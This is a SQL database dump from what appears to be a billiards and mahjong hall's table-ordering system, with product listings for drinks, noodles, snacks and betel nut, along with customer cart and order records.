INSERT INTO products VALUES('AD钙','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/Y74PWIqRJ8LbvR75.jpg',8.0,79,79,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('营养快线','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/5p0xJPK7KW1w3Q4L.jpg',8.0,134,134,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('老坛酸菜牛肉面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/4HMC4lH36abRGMJt.jpg',10.0,56,56,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('红烧牛肉面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/1qEBg0v9Qw302tLW.jpg',10.0,69,68,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('香辣牛肉干拌面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/t05Td8o68sk7UG6f.jpg',10.0,50,49,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('老坛酸菜干拌面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/DqAt7lu7A3pL49W0.jpg',10.0,64,62,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('香辣牛肉面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/lWLKItXsj592Uae6.jpg',10.0,57,57,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('红烧牛肉干拌面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/poESO9oMgSym0xQQ.jpg',10.0,51,46,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('香菇炖鸡面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/9LqwTSD49BsPSx7H.jpg',10.0,35,34,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('健力士黑啤','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/ccqxKi7svgRu9cME.jpg',18.0,536,530,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('旺仔牛奶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/Nbcxu3s0QQL8WRd2.jpg',8.0,121,121,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('杨协城马蹄爽','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/wQ9oFpsX031c5Mn7.jpg',8.0,94,93,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('50枸杞槟榔','槟榔','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/n7TMxFkt9oixBX5m.jpg',58.0,51,51,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('50和成天下','槟榔','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/vTHiBx7w8RQgS89t.jpg',58.0,68,65,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('百威新锐啤酒','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/ljAK52JE6POV0Kwb.jpg',16.0,378,248,'上架','syb185876','2025-12-31 15:23:27','2026-04-07 13:30:42');
INSERT INTO products VALUES('茶叶（询问客人喝什么茶）','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',8.0,300,300,'下架','syb201158','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('南京','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',32.0,1,1,'下架','syb201158','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('虚拟商品（988套餐换黑啤）','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',200.0,10,10,'下架','syb201158','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('名仕洋酒外卖()','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',1088.0,0,0,'下架','syb201158','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('火鸡面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/1LgHlQ235A6D53W4.jpg',18.0,58,56,'上架','syb201158','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('牛鞭汤','高汤','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603132224423522.jpg',60.0,45,45,'上架','syb216759','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('鸡汤','高汤','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603132224265983.jpg',45.0,38,38,'上架','syb216759','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('管理层事假','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',535.0,535,535,'下架','syb201158','2026-03-25 22:34:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('淀粉肠','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/nAd09vMbhOs5Orjd.jpg',5.0,6,2,'上架','syb201158','2026-04-03 14:12:33','2026-04-07 13:30:41');
INSERT INTO products VALUES('火腿肠','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/oQNWs388109XuPxk.jpg',5.0,13,13,'上架','syb201158','2026-04-03 14:12:33','2026-04-07 13:30:41');
CREATE TABLE carts (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          session_id TEXT NOT NULL,
          table_no TEXT,
          product_name TEXT NOT NULL,
          quantity INTEGER DEFAULT 1,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO carts VALUES(1,'sess_1773228119846_o18fpnp21',NULL,'管理员事假',2,'2026-03-11 11:22:27');
INSERT INTO carts VALUES(2,'sess_1773228102930_ai6mhflil',NULL,'百威新锐啤酒',1,'2026-03-11 11:22:44');
INSERT INTO carts VALUES(4,'sess_1773233575873_8d0ze7sy7',NULL,'管理员事假',1,'2026-03-11 12:53:00');
INSERT INTO carts VALUES(5,'sess_1773227871939_t06qbwhnz',NULL,'老坛酸菜牛肉面',1,'2026-03-11 15:19:21');
INSERT INTO carts VALUES(6,'sess_1773227871939_t06qbwhnz',NULL,'香辣牛肉干拌面',1,'2026-03-11 15:19:24');
INSERT INTO carts VALUES(7,'sess_1773242436311',NULL,'红烧牛肉干拌面',1,'2026-03-11 15:21:08');
INSERT INTO carts VALUES(8,'sess_1773242436311',NULL,'香菇炖鸡面',2,'2026-03-11 15:21:10');
INSERT INTO carts VALUES(9,'sess_1773246673752',NULL,'鱼皮花生',1,'2026-03-11 16:31:32');
INSERT INTO carts VALUES(10,'sess_1773246673752',NULL,'无穷鸡蛋',1,'2026-03-11 16:31:34');
INSERT INTO carts VALUES(11,'sess_1773246673752',NULL,'烤肠',1,'2026-03-11 16:31:41');
INSERT INTO carts VALUES(12,'sess_1773296729800',NULL,'50和成天下',2,'2026-03-12 06:25:47');
INSERT INTO carts VALUES(13,'sess_1773296729800',NULL,'50枸杞槟榔',1,'2026-03-12 06:25:50');
INSERT INTO carts VALUES(14,'sess_1773297220331',NULL,'无穷鸡蛋',1,'2026-03-12 06:33:49');
INSERT INTO carts VALUES(15,'sess_1773297220331',NULL,'光明酸奶',1,'2026-03-12 06:33:50');
INSERT INTO carts VALUES(16,'session_1773366400789_6648hjqan',NULL,'虚拟商品（百威换黑啤）',1,'2026-03-13 02:38:34');
INSERT INTO carts VALUES(17,'session_1773366400789_6648hjqan',NULL,'奥利奥冰淇淋甜筒',1,'2026-03-13 03:22:29');
INSERT INTO carts VALUES(24,'sess_1773385527329',NULL,'橙c美式',2,'2026-03-13 07:06:28');
INSERT INTO carts VALUES(25,'sess_1773385527329',NULL,'生椰拿铁（热）',1,'2026-03-13 07:06:34');
INSERT INTO carts VALUES(26,'sess_1773385527329',NULL,'生椰拿铁',1,'2026-03-13 07:06:36');
INSERT INTO carts VALUES(27,'sess_1773385527329',NULL,'纸巾',1,'2026-03-13 07:06:38');
INSERT INTO carts VALUES(49,'sess_1773396548567_4c27v4crg',NULL,'无穷鸡蛋',1,'2026-03-13 11:24:18');
INSERT INTO carts VALUES(51,'sess_1773396548567_4c27v4crg',NULL,'无穷爱辣鸡米',2,'2026-03-13 11:24:20');
INSERT INTO carts VALUES(74,'sess_1773565222374_3ac4rdu5b','雀2','茶兀',8,'2026-03-15 09:16:35');
INSERT INTO carts VALUES(93,'sess_1774028462509_gwz7qqom1','普台11','开瓶费200',1,'2026-03-21 06:36:28');
INSERT INTO carts VALUES(94,'sess_1774054755657_cb04ejc9i','雀1','茶兀',1,'2026-03-22 02:54:09');
INSERT INTO carts VALUES(95,'sess_1774201248479_dgo5hpacw','雀1','if椰子水',1,'2026-03-22 17:46:23');
INSERT INTO carts VALUES(97,'sess_1774201907082_wch7y186k','雀1','if椰子水',1,'2026-03-22 18:13:20');
INSERT INTO carts VALUES(107,'sess_1774251124131_iul3oi38o','普台1','海苔卷',1,'2026-03-23 07:33:28');
INSERT INTO carts VALUES(108,'sess_1774251124131_iul3oi38o','普台1','红茶拿铁',1,'2026-03-23 07:33:59');
INSERT INTO carts VALUES(112,'sess_1775103028548_88bdsqilj','普台2','火鸡面',2,'2026-04-02 04:10:33');
INSERT INTO carts VALUES(113,'sess_1773381270419_zsy2ci5y1','雀1','牛鞭汤',2,'2026-04-02 04:15:28');
INSERT INTO carts VALUES(114,'sess_1773381270419_zsy2ci5y1','雀1','光明酸奶',1,'2026-04-02 04:16:15');
INSERT INTO carts VALUES(129,'sess_1775132498591_6cphp7gkf','普台7','柠檬水',1,'2026-04-02 12:21:44');
INSERT INTO carts VALUES(159,'sess_1775308499679_77n8vwsi9','普台13','柠檬水',4,'2026-04-04 13:30:26');
INSERT INTO carts VALUES(195,'sess_1775395602118_j9z0b6k5m','普台25','淀粉肠',2,'2026-04-05 13:26:46');
INSERT INTO carts VALUES(268,'sess_1775567851295_umaq0b0vs','BOSS2','百威新锐啤酒',7,'2026-04-07 13:18:04');
INSERT INTO carts VALUES(273,'sess_1775132498591_6cphp7gkf','普台7','双萃柠檬茶',1,'2026-04-07 13:25:26');
CREATE TABLE orders (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          order_no TEXT UNIQUE NOT NULL,
          table_no TEXT,
          items TEXT NOT NULL,
          total_price REAL DEFAULT 0,
          status TEXT DEFAULT '待处理',
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        , updated_at DATETIME, device_fingerprint TEXT);
INSERT INTO orders VALUES(1,'TG1773396237860','未指定','[{"name":"茶兀","quantity":1,"price":8},{"name":"苏打水","quantity":1,"price":8},{"name":"开瓶费100","quantity":1,"price":100},{"name":"酒桌游戏牌","quantity":1,"price":5},{"name":"冰水（可续杯）","quantity":1,"price":3},{"name":"98g开心果","quantity":1,"price":25}]',149.0,'已取消','2026-03-13 10:03:58','2026-03-15 16:14:42',NULL);
INSERT INTO orders VALUES(2,'TG1773397291544','未指定','[{"name":"单份水果","quantity":1,"price":28},{"name":"单丛（一杯）","quantity":1,"price":8}]',36.0,'已取消','2026-03-13 10:21:31','2026-03-15 16:14:50',NULL);
INSERT INTO orders VALUES(3,'TG1773404493448','未指定','[{"name":"鲜牛奶","quantity":1,"price":18},{"name":"柠檬水","quantity":2,"price":10}]',38.0,'已完成','2026-03-13 12:21:33','2026-03-15 16:14:59',NULL);
INSERT INTO orders VALUES(4,'TG1773407104461','未指定','[{"name":"红枣桂圆茶","quantity":1,"price":25},{"name":"茉香柠檬茶","quantity":1,"price":18},{"name":"香辣牛肉干拌面","quantity":1,"price":10}]',53.0,'已取消','2026-03-13 13:05:04','2026-03-15 18:32:21',NULL);
INSERT INTO orders VALUES(5,'TG1773407111842','未指定','[{"name":"草莓抹茶牛乳","quantity":2,"price":23},{"name":"茶兀","quantity":1,"price":8}]',54.0,'已取消','2026-03-13 13:05:12','2026-03-15 18:32:24',NULL);
INSERT INTO orders VALUES(6,'TG1773560299096','未指定','[{"name":"if椰子水","quantity":1,"price":10},{"name":"茶兀","quantity":1,"price":8},{"name":"苏打水","quantity":1,"price":8}]',26.0,'已取消','2026-03-15 07:38:19','2026-03-15 18:32:23',NULL);
INSERT INTO orders VALUES(7,'TG1773563358776','未指定','[{"name":"九制橄榄","quantity":1,"price":8}]',8.0,'已取消','2026-03-15 08:29:19','2026-03-15 18:32:26',NULL);
INSERT INTO orders VALUES(8,'TG1773565236729','未指定','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已取消','2026-03-15 09:00:37','2026-03-15 18:32:28',NULL);
INSERT INTO orders VALUES(9,'TG1773565245874','未指定','[{"name":"草莓抹茶牛乳","quantity":1,"price":23}]',23.0,'已取消','2026-03-15 09:00:46','2026-03-15 17:14:20',NULL);
INSERT INTO orders VALUES(10,'TG1773565250782','未指定','[{"name":"手套","quantity":1,"price":5}]',5.0,'已完成','2026-03-15 09:00:51','2026-03-15 17:14:17',NULL);
INSERT INTO orders VALUES(11,'TG1773568313512','雀1','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-15 09:51:53','2026-03-16 08:55:55',NULL);
INSERT INTO orders VALUES(12,'TG1773570104756','雀1','[{"name":"红烧牛肉面","quantity":2,"price":10},{"name":"香辣牛肉干拌面","quantity":1,"price":10},{"name":"老坛酸菜干拌面","quantity":1,"price":10},{"name":"香辣牛肉面","quantity":1,"price":10}]',50.0,'已完成','2026-03-15 10:21:45','2026-03-16 08:55:53',NULL);
INSERT INTO orders VALUES(13,'TG1773578144405','未指定','[{"name":"小青柑（一泡）","quantity":1,"price":38},{"name":"苏打水","quantity":1,"price":8}]',46.0,'已完成','2026-03-15 12:35:44','2026-03-15 22:23:31',NULL);
INSERT INTO orders VALUES(16,'TG1773622638505','雀1','[{"name":"if椰子水","quantity":1,"price":10},{"name":"开瓶费200","quantity":1,"price":200},{"name":"百威新锐啤酒","quantity":1,"price":16},{"name":"普洱茶（一杯）","quantity":1,"price":8},{"name":"至尊果盘","quantity":1,"price":88},{"name":"芙蓉王 代购","quantity":2,"price":30},{"name":"酸甜话梅","quantity":2,"price":8},{"name":"无穷爱辣鸡米","quantity":1,"price":2}]',400.0,'已完成','2026-03-16 00:57:18','2026-03-16 09:10:47',NULL);
INSERT INTO orders VALUES(17,'TG1773623540810','雀1','[{"name":"100和成天下","quantity":2,"price":110}]',220.0,'已完成','2026-03-16 01:12:21','2026-03-16 09:14:24',NULL);
INSERT INTO orders VALUES(18,'TG1773623682285','雀1','[{"name":"50枸杞槟榔","quantity":1,"price":58}]',58.0,'已取消','2026-03-16 01:14:42','2026-03-22 13:23:10',NULL);
INSERT INTO orders VALUES(19,'TG1774029575709','BOSS1','[{"name":"港式鸳鸯","quantity":1,"price":20}]',20.0,'已取消','2026-03-20 17:59:36','2026-03-22 13:23:11',NULL);
INSERT INTO orders VALUES(20,'TG1774156957864','雀1','[{"name":"if椰子水","quantity":2,"price":10}]',20.0,'已完成','2026-03-22 05:22:38','2026-03-23 17:13:04','4c9c30b9');
INSERT INTO orders VALUES(21,'TG1774201989281','雀1','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-22 17:53:09','2026-03-23 17:13:09','2699cee');
INSERT INTO orders VALUES(22,'TG1774204257577','雀1','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-22 18:30:57','2026-03-23 17:13:12','18a5a7fc');
INSERT INTO orders VALUES(23,'TG1774204413420','雀1','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-22 18:33:33','2026-03-23 17:13:15','18a5a7fc');
INSERT INTO orders VALUES(24,'TG1774221241085','雀1','[{"name":"if椰子水","quantity":2,"price":10}]',20.0,'已完成','2026-03-22 23:14:01','2026-03-23 17:13:18','18a5a7fc');
INSERT INTO orders VALUES(25,'TG1774221529258','雀1','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-22 23:18:49','2026-03-23 17:13:21','18a5a7fc');
INSERT INTO orders VALUES(26,'TG1774222093062','雀1','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-22 23:28:13','2026-03-23 17:13:24','18a5a7fc');
INSERT INTO orders VALUES(27,'TG1774223080107','雀1','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-22 23:44:40','2026-03-23 17:13:29','18a5a7fc');
INSERT INTO orders VALUES(28,'TG1774223422880','普台2','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-03-22 23:50:23','2026-03-25 10:30:13','18a5a7fc');
INSERT INTO orders VALUES(29,'TG1774264834041','雀1','[{"name":"98g开心果","quantity":2,"price":25},{"name":"酸甜话梅","quantity":1,"price":8}]',58.0,'已完成','2026-03-23 11:20:34','2026-03-25 10:30:09','4c9c30b9');
INSERT INTO orders VALUES(30,'TG1774425016579','雀1','[{"name":"冰水（可续杯）","quantity":1,"price":3}]',3.0,'已取消','2026-03-25 07:50:16','2026-03-26 20:06:37','4c9c30b9');
INSERT INTO orders VALUES(31,'TG1774946489816','VIP6','[{"name":"无穷鸡腿","quantity":1,"price":20}]',20.0,'已完成','2026-03-31 08:41:30','2026-03-31 16:41:47','1a037c9c');
INSERT INTO orders VALUES(32,'TG1775102991668','雀1','[{"name":"火鸡面","quantity":1,"price":18}]',18.0,'已取消','2026-04-02 04:09:52','2026-04-02 07:58:49','6fe8a136');
INSERT INTO orders VALUES(33,'TG1775116748003','雀2','[{"name":"火鸡面","quantity":1,"price":18}]',18.0,'已取消','2026-04-02 07:59:08','2026-04-02 08:01:31','44314755');
INSERT INTO orders VALUES(34,'TG1775116788110','雀2','[{"name":"火鸡面","quantity":1,"price":18}]',18.0,'已取消','2026-04-02 07:59:48','2026-04-02 08:01:29','44314755');
INSERT INTO orders VALUES(35,'TG1775117164303','普台28','[{"name":"牛鞭汤","quantity":1,"price":60}]',60.0,'已取消','2026-04-02 08:06:04','2026-04-02 08:08:50','44314755');
INSERT INTO orders VALUES(36,'TG1775117177660','普台28','[{"name":"牛鞭汤","quantity":1,"price":60}]',60.0,'已完成','2026-04-02 08:06:17','2026-04-02 08:08:36','44314755');
INSERT INTO orders VALUES(37,'TG1775130668608','普台27','[{"name":"可乐","quantity":1,"price":6},{"name":"AD钙","quantity":2,"price":8},{"name":"百岁山","quantity":1,"price":8},{"name":"红枣桂圆茶","quantity":1,"price":25},{"name":"鸭屎香柠檬茶","quantity":1,"price":18}]',73.0,'已取消','2026-04-02 11:51:08','2026-04-02 11:56:26','600f8455');
INSERT INTO orders VALUES(38,'TG1775131319790','TV台','[{"name":"if椰子水","quantity":1,"price":10},{"name":"茶兀","quantity":2,"price":8},{"name":"苏打水","quantity":1,"price":8}]',34.0,'已取消','2026-04-02 12:02:00','2026-04-02 12:03:08','44314755');
INSERT INTO orders VALUES(39,'TG1775132253126','斯诺克31','[{"name":"鸭屎香柠檬茶","quantity":2,"price":18}]',36.0,'已取消','2026-04-02 12:17:33','2026-04-02 12:19:00','6953430d');
INSERT INTO orders VALUES(40,'TG1775139865944','普台25','[{"name":"茉香柠檬茶","quantity":1,"price":18}]',18.0,'已取消','2026-04-02 14:24:26','2026-04-02 14:25:01','51f7602');
INSERT INTO orders VALUES(41,'TG1775139896530','普台25','[{"name":"茉香柠檬茶","quantity":1,"price":18},{"name":"冰水（可续杯）","quantity":1,"price":3}]',21.0,'已取消','2026-04-02 14:24:56','2026-04-02 14:25:24','51f7602');
INSERT INTO orders VALUES(42,'TG1775144922141','VIP7','[{"name":"屈臣氏沙示汽水","quantity":3,"price":6}]',18.0,'已取消','2026-04-02 15:48:42','2026-04-02 15:51:44','758b85bb');
INSERT INTO orders VALUES(43,'TG1775147914359','普台9','[{"name":"老盐黄皮冰茶","quantity":1,"price":24},{"name":"单丛（一杯）","quantity":1,"price":8}]',32.0,'已取消','2026-04-02 16:38:34','2026-04-02 16:40:41','167dd2ed');
INSERT INTO orders VALUES(44,'TG1775194776645','普台1','[{"name":"火鸡面","quantity":1,"price":18},{"name":"if椰子水","quantity":1,"price":10}]',28.0,'已取消','2026-04-03 05:39:37','2026-04-03 05:40:42','90b8e60');
INSERT INTO orders VALUES(45,'TG_TEST_001','普台1','[{"name":"if椰子水","quantity":2,"price":10},{"name":"茶兀","quantity":1,"price":8},{"name":"开瓶费100","quantity":1,"price":100}]',128.0,'已完成','2026-04-03 06:05:30','2026-04-03 06:06:02',NULL);
INSERT INTO orders VALUES(46,'TG_TEST_002','普台1','[{"name":"if椰子水","quantity":3,"price":10},{"name":"茶兀","quantity":2,"price":8},{"name":"开瓶费100","quantity":1,"price":100}]',146.0,'已完成','2026-04-03 06:08:11','2026-04-03 06:09:04',NULL);
INSERT INTO orders VALUES(47,'TG_TEST_003','普台1','[]',0.0,'已取消','2026-04-03 06:12:04','2026-04-03 06:12:34',NULL);
INSERT INTO orders VALUES(48,'TG_TEST_UI','普台1','[{"name":"if椰子水","quantity":3,"price":10},{"name":"茶兀","quantity":2,"price":8},{"name":"开瓶费100","quantity":1,"price":100}]',146.0,'已完成','2026-04-03 06:12:48','2026-04-03 06:13:56',NULL);
INSERT INTO orders VALUES(49,'TG_UI_TEST','普台1','[{"name":"茶兀","quantity":2,"price":8}]',16.0,'已完成','2026-04-03 06:14:31','2026-04-03 06:15:24',NULL);
INSERT INTO orders VALUES(50,'TG_REAL_TEST','普台1','[{"name":"啤酒","quantity":3,"price":28},{"name":"花生","quantity":2,"price":18},{"name":"可乐","quantity":2,"price":5}]',130.0,'已完成','2026-04-03 06:19:27','2026-04-03 06:20:23',NULL);
INSERT INTO orders VALUES(51,'TG_MYCHROME','普台1','[{"name":"啤酒","quantity":3,"price":28},{"name":"花生","quantity":2,"price":18},{"name":"可乐","quantity":2,"price":5}]',130.0,'已完成','2026-04-03 06:22:05','2026-04-03 06:23:06',NULL);
INSERT INTO orders VALUES(52,'TG_FINAL_TEST','普台1','[]',0.0,'已取消','2026-04-03 06:23:52','2026-04-03 06:24:07',NULL);
INSERT INTO orders VALUES(53,'TG_MODAL_TEST','普台1','[{"name":"百威新锐啤酒","quantity":2,"price":28},{"name":"鱼皮花生","quantity":2,"price":18},{"name":"可乐","quantity":2,"price":5}]',102.0,'已完成','2026-04-03 06:48:39','2026-04-03 06:49:01',NULL);
INSERT INTO orders VALUES(54,'TG_MODAL_FIX','普台1','[{"name":"百威新锐啤酒","quantity":2,"price":28},{"name":"鱼皮花生","quantity":2,"price":18},{"name":"可乐","quantity":2,"price":5}]',102.0,'已完成','2026-04-03 06:49:48','2026-04-03 06:50:56',NULL);
INSERT INTO orders VALUES(55,'TG1775203391114','普台20','[{"name":"扑克牌","quantity":1,"price":5},{"name":"百岁山","quantity":2,"price":8},{"name":"东方树叶","quantity":1,"price":8}]',29.0,'已完成','2026-04-03 08:03:11','2026-04-03 08:05:06','9ed6e7b');
INSERT INTO orders VALUES(56,'TG1775203504866','普台20','[{"name":"手套","quantity":1,"price":5}]',5.0,'已完成','2026-04-03 08:05:05','2026-04-03 08:05:11','9ed6e7b');
INSERT INTO orders VALUES(57,'TG1775203513705','普台20','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-04-03 08:05:14','2026-04-03 08:05:58','9ed6e7b');
INSERT INTO orders VALUES(58,'TG1775222257600','普台2','[{"name":"扑克牌","quantity":1,"price":5}]',5.0,'已完成','2026-04-03 13:17:37','2026-04-03 13:18:14','9ed6e7b');
INSERT INTO orders VALUES(59,'TG1775222969941','普台10','[{"name":"柠檬水","quantity":1,"price":10}]',10.0,'已完成','2026-04-03 13:29:30','2026-04-03 13:30:58','60671638');
INSERT INTO orders VALUES(60,'TG1775229580512','VIP2','[{"name":"草莓抹茶牛乳","quantity":1,"price":23}]',23.0,'已完成','2026-04-03 15:19:40','2026-04-03 15:21:20','600f8455');
INSERT INTO orders VALUES(61,'TG1775234858027','VIP2','[{"name":"烤肠","quantity":3,"price":8}]',24.0,'已完成','2026-04-03 16:47:38','2026-04-03 16:49:04','600f8455');
INSERT INTO orders VALUES(62,'TG1775237164451','VIP3','[{"name":"东方树叶","quantity":4,"price":8}]',32.0,'已完成','2026-04-03 17:26:04','2026-04-03 17:26:36','75bff6a0');
INSERT INTO orders VALUES(63,'TG1775293522262','普台7','[{"name":"椰树椰汁","quantity":1,"price":8},{"name":"王老吉凉茶","quantity":1,"price":6}]',14.0,'已完成','2026-04-04 09:05:22','2026-04-04 09:06:21','783893a7');
INSERT INTO orders VALUES(64,'TG1775300323613','雀2','[{"name":"草莓抹茶牛乳","quantity":1,"price":23}]',23.0,'已完成','2026-04-04 10:58:43','2026-04-04 10:59:09','20daefd7');
INSERT INTO orders VALUES(65,'TG1775300382814','普台27','[{"name":"蜂蜜水","quantity":2,"price":10}]',20.0,'已完成','2026-04-04 10:59:43','2026-04-04 10:59:58','4fd6324c');
INSERT INTO orders VALUES(66,'TG1775302613721','普台27','[{"name":"椰丸奶茶","quantity":1,"price":18}]',18.0,'已完成','2026-04-04 11:36:54','2026-04-04 11:38:19','312ba23d');
INSERT INTO orders VALUES(67,'TG1775303796550','普台2','[{"name":"招牌柠檬茶","quantity":1,"price":18},{"name":"美式","quantity":1,"price":18}]',36.0,'已完成','2026-04-04 11:56:36','2026-04-04 11:57:29','94fd6b0');
INSERT INTO orders VALUES(68,'TG1775308727897','普台13','[{"name":"柠檬水","quantity":4,"price":10}]',40.0,'已完成','2026-04-04 13:18:48','2026-04-04 13:20:21','76ea3b46');
INSERT INTO orders VALUES(69,'TG1775311713698','VIP2','[{"name":"苏打水","quantity":1,"price":8}]',8.0,'已完成','2026-04-04 14:08:34','2026-04-04 14:09:47','212de659');
INSERT INTO orders VALUES(70,'TG1775312783360','VIP6','[{"name":"百岁山","quantity":1,"price":8}]',8.0,'已完成','2026-04-04 14:26:23','2026-04-04 14:27:15','7e5b8214');
INSERT INTO orders VALUES(71,'TG1775314903813','VIP8','[{"name":"红牛","quantity":3,"price":10}]',30.0,'已完成','2026-04-04 15:01:44','2026-04-04 15:02:13','312ba23d');
INSERT INTO orders VALUES(72,'TG1775316263348','普台13','[{"name":"烤肠","quantity":2,"price":8}]',16.0,'已完成','2026-04-04 15:24:23','2026-04-04 15:52:57','3ceff004');
INSERT INTO orders VALUES(73,'TG1775317808536','普台8','[{"name":"淀粉肠","quantity":1,"price":5}]',5.0,'已取消','2026-04-04 15:50:08','2026-04-04 15:52:11','45c818ca');
INSERT INTO orders VALUES(74,'TG1775318225834','普台8','[{"name":"香脆肠","quantity":1,"price":3},{"name":"劲仔小鱼","quantity":1,"price":3},{"name":"笋尖","quantity":1,"price":5}]',11.0,'已完成','2026-04-04 15:57:06','2026-04-04 15:58:00','45c818ca');
INSERT INTO orders VALUES(75,'TG1775319539706','斯诺克30','[{"name":"草莓抹茶牛乳","quantity":1,"price":23}]',23.0,'已完成','2026-04-04 16:19:00','2026-04-04 16:20:15','7fe8bebd');
INSERT INTO orders VALUES(76,'TG1775319567737','VIP8','[{"name":"烤肠","quantity":4,"price":8},{"name":"绿茶","quantity":1,"price":6},{"name":"冰红茶","quantity":1,"price":6},{"name":"可乐","quantity":1,"price":6},{"name":"苹果冰茶/苏打","quantity":1,"price":22}]',72.0,'已完成','2026-04-04 16:19:28','2026-04-04 16:23:57','600f8455');
INSERT INTO orders VALUES(77,'TG1775319774405','VIP8','[{"name":"红枣桂圆茶","quantity":1,"price":25}]',25.0,'已完成','2026-04-04 16:22:54','2026-04-04 16:23:53','600f8455');
INSERT INTO orders VALUES(78,'TG1775325613562','VIP1','[{"name":"百岁山","quantity":1,"price":8},{"name":"绿茶","quantity":1,"price":6}]',14.0,'已完成','2026-04-04 18:00:13','2026-04-04 18:00:47','73d9d9bc');
INSERT INTO orders VALUES(79,'TG1775328607686','VIP1','[{"name":"粗荷花 代购","quantity":1,"price":50}]',50.0,'已完成','2026-04-04 18:50:08','2026-04-04 18:50:42','73d9d9bc');
INSERT INTO orders VALUES(80,'TG1775372850358','普台9','[{"name":"招牌柠檬茶","quantity":1,"price":18}]',18.0,'已完成','2026-04-05 07:07:30','2026-04-05 15:08:54','74f4224a');
INSERT INTO orders VALUES(81,'TG1775383693315','普台19','[{"name":"淀粉肠","quantity":2,"price":5},{"name":"香辣牛肉干拌面","quantity":1,"price":10},{"name":"烤肠","quantity":1,"price":8}]',28.0,'已完成','2026-04-05 10:08:13','2026-04-05 18:10:27','2c5bfa5f');
INSERT INTO orders VALUES(82,'TG1775386832595','普台27','[{"name":"美式","quantity":1,"price":18},{"name":"柠檬水","quantity":1,"price":10}]',28.0,'已完成','2026-04-05 11:00:32','2026-04-05 19:03:22','312ba23d');
INSERT INTO orders VALUES(83,'TG1775388778151','普台16','[{"name":"柠檬水","quantity":1,"price":10}]',10.0,'已完成','2026-04-05 11:32:58','2026-04-05 19:33:57','5b7a3eb6');
INSERT INTO orders VALUES(84,'TG1775390683510','普台7','[{"name":"可乐","quantity":1,"price":6}]',6.0,'已完成','2026-04-05 12:04:43','2026-04-05 20:05:42','2146c47d');
